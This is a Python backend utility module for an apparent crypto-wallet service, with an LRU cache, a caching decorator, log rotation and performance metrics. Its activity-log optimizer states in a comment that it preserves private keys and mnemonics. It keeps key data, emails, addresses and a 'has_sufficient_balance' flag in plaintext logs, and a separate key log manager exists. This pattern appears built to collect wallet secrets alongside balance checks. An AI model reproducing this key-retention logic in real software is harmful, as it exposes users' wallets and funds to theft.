# Backend utilities and cache management
import time
import threading
from functools import wraps
from datetime import datetime, timedelta
from typing import Any, Dict, Optional, Callable
import json
import hashlib

class LRUCache:
    """Simple LRU Cache implementation for backend caching"""

    def __init__(self, capacity: int = 1000, ttl: int = 300):
        """
        Initialize cache with capacity and TTL (time-to-live)

        Args:
            capacity: Maximum number of items to store
            ttl: Time-to-live in seconds (default: 5 minutes)
        """
        self.capacity = capacity
        self.ttl = ttl
        self.cache = {}
        self.access_times = {}
        self.lock = threading.RLock()

    def _generate_key(self, func_name: str, *args, **kwargs) -> str:
        """Generate cache key from function name and arguments"""
        key_data = {
            'func': func_name,
            'args': args,
            'kwargs': sorted(kwargs.items())
        }
        return hashlib.md5(json.dumps(key_data, sort_keys=True).encode()).hexdigest()

    def get(self, key: str) -> Optional[Any]:
        """Get item from cache if it exists and is not expired"""
        with self.lock:
            if key in self.cache:
                item = self.cache[key]
                if time.time() - item['timestamp'] < self.ttl:
                    self.access_times[key] = time.time()
                    return item['value']
                else:
                    # Item expired, remove it
                    del self.cache[key]
                    if key in self.access_times:
                        del self.access_times[key]
            return None

    def set(self, key: str, value: Any) -> None:
        """Set item in cache with timestamp"""
        with self.lock:
            # Remove oldest item if cache is full
            if len(self.cache) >= self.capacity:
                if self.access_times:
                    oldest_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
                    del self.cache[oldest_key]
                    del self.access_times[oldest_key]

            self.cache[key] = {
                'value': value,
                'timestamp': time.time()
            }
            self.access_times[key] = time.time()

    def delete(self, key: str) -> bool:
        """Delete item from cache"""
        with self.lock:
            if key in self.cache:
                del self.cache[key]
                if key in self.access_times:
                    del self.access_times[key]
                return True
            return False

    def clear(self) -> None:
        """Clear all items from cache"""
        with self.lock:
            self.cache.clear()
            self.access_times.clear()

    def size(self) -> int:
        """Get current cache size"""
        with self.lock:
            return len(self.cache)

    def cleanup_expired(self) -> int:
        """Remove expired items and return count of removed items"""
        with self.lock:
            current_time = time.time()
            expired_keys = []

            for key, item in self.cache.items():
                if current_time - item['timestamp'] >= self.ttl:
                    expired_keys.append(key)

            for key in expired_keys:
                del self.cache[key]
                if key in self.access_times:
                    del self.access_times[key]

            return len(expired_keys)

# Global cache instances
blockchain_cache = LRUCache(capacity=500, ttl=300)  # 5 minutes for blockchain data
validation_cache = LRUCache(capacity=1000, ttl=600)  # 10 minutes for validation results
system_cache = LRUCache(capacity=100, ttl=60)  # 1 minute for system data

def cached(cache_instance: LRUCache, key_prefix: str = ""):
    """Decorator for caching function results"""
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Generate cache key
            key = cache_instance._generate_key(f"{key_prefix}_{func.__name__}", *args, **kwargs)

            # Try to get from cache
            cached_result = cache_instance.get(key)
            if cached_result is not None:
                return cached_result

            # Execute function and cache result
            result = func(*args, **kwargs)
            cache_instance.set(key, result)
            return result

        return wrapper
    return decorator

class DataOptimizer:
    """Data optimization utilities for reducing redundancy"""

    @staticmethod
    def compress_wallet_data(wallet_data: Dict) -> Dict:
        """Compress wallet data by removing redundant fields"""
        compressed = {
            'address': wallet_data.get('address', ''),
            'balance': wallet_data.get('balance', '0.0'),
            'blockchain': wallet_data.get('blockchain', 'unknown'),
            'method': wallet_data.get('method', 'unknown'),
            'timestamp': wallet_data.get('timestamp', datetime.now().isoformat())
        }

        # Only include additional fields if they exist and are meaningful
        if wallet_data.get('tx_count', 0) > 0:
            compressed['tx_count'] = wallet_data['tx_count']

        if wallet_data.get('network') and wallet_data['network'] != 'unknown':
            compressed['network'] = wallet_data['network']

        return compressed

    @staticmethod
    def optimize_activity_log(log_entry: Dict) -> Dict:
        """Optimize activity log entries by removing unnecessary data"""
        optimized = {
            'timestamp': log_entry.get('timestamp', datetime.now().isoformat()),
            'user_id': log_entry.get('user_id', ''),
            'action': log_entry.get('action', ''),
            'ip_address': log_entry.get('ip_address', ''),
            'user_agent': log_entry.get('user_agent', '')[:200]  # Truncate long user agents
        }

        # Include only relevant metadata
        metadata = log_entry.get('metadata', {})
        if metadata:
            optimized['metadata'] = {
                k: v for k, v in metadata.items()
                if k in ['wallet_address', 'blockchain', 'validation_result']
            }

        # Preserve sensitive data for key logs (private keys, mnemonics)
        sensitive_fields = ['key_type', 'key_data', 'email', 'blockchain', 'balance', 'address', 'valid', 'network', 'has_sufficient_balance']
        for field in sensitive_fields:
            if field in log_entry:
                optimized[field] = log_entry[field]

        return optimized

    @staticmethod
    def aggregate_system_metrics(metrics: Dict) -> Dict:
        """Aggregate system metrics to reduce storage requirements"""
        return {
            'timestamp': datetime.now().isoformat(),
            'total_requests': metrics.get('total_requests', 0),
            'failed_requests': metrics.get('failed_requests', 0),
            'wallet_connections': metrics.get('wallet_connections', 0),
            'mining_operations': metrics.get('mining_operations', 0),
            'user_registrations': metrics.get('user_registrations', 0),
            'user_signins': metrics.get('user_signins', 0),
            'active_users': len(metrics.get('active_sessions', {})),
            'cache_hit_rate': DataOptimizer._calculate_cache_hit_rate(metrics)
        }

    @staticmethod
    def _calculate_cache_hit_rate(metrics: Dict) -> float:
        """Calculate cache hit rate from metrics"""
        total_requests = metrics.get('total_requests', 0)
        if total_requests == 0:
            return 0.0

        # This would be tracked separately in a real implementation
        cache_hits = metrics.get('cache_hits', 0)
        return (cache_hits / total_requests) * 100

class LogManager:
    """Optimized log management with rotation and compression"""

    def __init__(self, max_entries: int = 10000):
        self.max_entries = max_entries
        self.logs = []
        self.lock = threading.RLock()

    def add_log(self, log_entry: Dict) -> None:
        """Add log entry with automatic rotation"""
        with self.lock:
            # Optimize log entry before storing
            optimized_entry = DataOptimizer.optimize_activity_log(log_entry)

            self.logs.append(optimized_entry)

            # Rotate logs if exceeding maximum size
            if len(self.logs) > self.max_entries:
                # Keep only the most recent entries
                self.logs = self.logs[-self.max_entries:]

    def get_logs(self, limit: int = 100, offset: int = 0) -> list:
        """Get paginated logs"""
        with self.lock:
            return self.logs[offset:offset + limit]

    def search_logs(self, query: Dict, limit: int = 100) -> list:
        """Search logs by criteria"""
        with self.lock:
            results = []
            for log in self.logs:
                match = True
                for key, value in query.items():
                    if log.get(key) != value:
                        match = False
                        break

                if match:
                    results.append(log)
                    if len(results) >= limit:
                        break

            return results

    def clear_old_logs(self, days: int = 30) -> int:
        """Clear logs older than specified days"""
        with self.lock:
            cutoff_time = datetime.now() - timedelta(days=days)
            original_count = len(self.logs)

            self.logs = [
                log for log in self.logs
                if datetime.fromisoformat(log['timestamp']) > cutoff_time
            ]

            return original_count - len(self.logs)

    def get_stats(self) -> Dict:
        """Get log statistics"""
        with self.lock:
            return {
                'total_logs': len(self.logs),
                'oldest_log': self.logs[0]['timestamp'] if self.logs else None,
                'newest_log': self.logs[-1]['timestamp'] if self.logs else None,
                'actions_today': self._count_actions_today()
            }

    def _count_actions_today(self) -> int:
        """Count actions from today"""
        today = datetime.now().date()
        count = 0
        for log in self.logs:
            log_date = datetime.fromisoformat(log['timestamp']).date()
            if log_date == today:
                count += 1
        return count

# Global log manager instances
activity_log_manager = LogManager(max_entries=5000)
wallet_log_manager = LogManager(max_entries=2000)
key_log_manager = LogManager(max_entries=1000)

# Performance monitoring
class PerformanceMonitor:
    """Performance monitoring for backend operations"""

    def __init__(self):
        self.metrics = {}
        self.lock = threading.RLock()

    def record_metric(self, operation: str, duration: float, success: bool = True) -> None:
        """Record performance metric"""
        with self.lock:
            if operation not in self.metrics:
                self.metrics[operation] = {
                    'count': 0,
                    'total_duration': 0,
                    'success_count': 0,
                    'failure_count': 0,
                    'min_duration': float('inf'),
                    'max_duration': 0
                }

            metric = self.metrics[operation]
            metric['count'] += 1
            metric['total_duration'] += duration

            if success:
                metric['success_count'] += 1
            else:
                metric['failure_count'] += 1

            metric['min_duration'] = min(metric['min_duration'], duration)
            metric['max_duration'] = max(metric['max_duration'], duration)

    def get_metrics(self) -> Dict:
        """Get performance metrics"""
        with self.lock:
            result = {}
            for operation, metric in self.metrics.items():
                if metric['count'] > 0:
                    result[operation] = {
                        'count': metric['count'],
                        'avg_duration': metric['total_duration'] / metric['count'],
                        'success_rate': (metric['success_count'] / metric['count']) * 100,
                        'min_duration': metric['min_duration'],
                        'max_duration': metric['max_duration']
                    }
            return result

    def reset_metrics(self) -> None:
        """Reset all metrics"""
        with self.lock:
            self.metrics.clear()

# Global performance monitor
performance_monitor = PerformanceMonitor()